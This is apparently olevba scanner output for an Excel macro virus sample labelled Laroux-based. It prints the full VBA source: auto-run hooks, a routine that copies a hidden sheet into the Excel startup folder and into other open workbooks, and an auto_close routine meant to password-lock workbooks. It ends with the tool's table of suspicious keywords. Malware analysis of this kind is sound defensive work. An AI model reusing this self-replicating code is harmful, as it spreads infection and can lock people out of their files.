olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-f382d0918dd4d80e0f949f54032f5c2d1357d236
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO GTHOMSNZ.bas 
in file: Virus.MSExcel.Laroux-based-f382d0918dd4d80e0f949f54032f5c2d1357d236 - OLE stream: '_VBA_PROJECT_CUR/VBA/GTHOMSNZ'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error GoTo all
    Application.OnSheetActivate = "GTHOMSONZ"
all:
End Sub

Sub GTHOMSONZ()
Attribute GTHOMSONZ.VB_ProcData.VB_Invoke_Func = " \n14"
   On Error GoTo here
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "GTHMSNZ.XLS")
    If m$ = "GTHMSNZ.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10

Select Case whichfile

    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("GTHOMSNZ").Visible = True
    Sheets("GTHOMSNZ").Select
    Sheets("GTHOMSNZ").Copy
    With ActiveWorkbook
        .Title = "GTHOMSONZ"
        .Subject = "GTHOMSONZ"
        .Author = "GTHOMSONZ"
        .Keywords = "GTHOMSONZ"
        .Comments = "GTHOMSONZ"
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "GTHMSNZ.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("GTHOMSNZ").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "GTHMSNZ.XLS!GTHOMSONZ"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "GTHOMSNZ" Then
        Workbooks("GTHMSNZ.XLS").Sheets("GTHOMSNZ").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("GTHOMSNZ").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "GTHMSNZ.XLS!GTHOMSONZ"
    Case Else
End Select
here:
End Sub

Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
On Error GoTo ok
 today = Date
 ok = Day(today)
 If ok = 32 Or ok = 33 Then
   MyFile = Dir("C:\BOOTLOG.PRV", vbHidden)
     If MyFile = "BOOTLOG.PRV" Then
        ActiveWorkbook.SaveAs FileFormat:=xlNormal, _
        Password:="80", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
       Else
        pass = Int((197 * Rnd) + 168)
        ActiveWorkbook.SaveAs FileFormat:=xlNormal, _
        Password:=pass, WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
     End If
 End If
ok:
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     16 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  GTHOMSN
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
' 0085     13 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  List
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

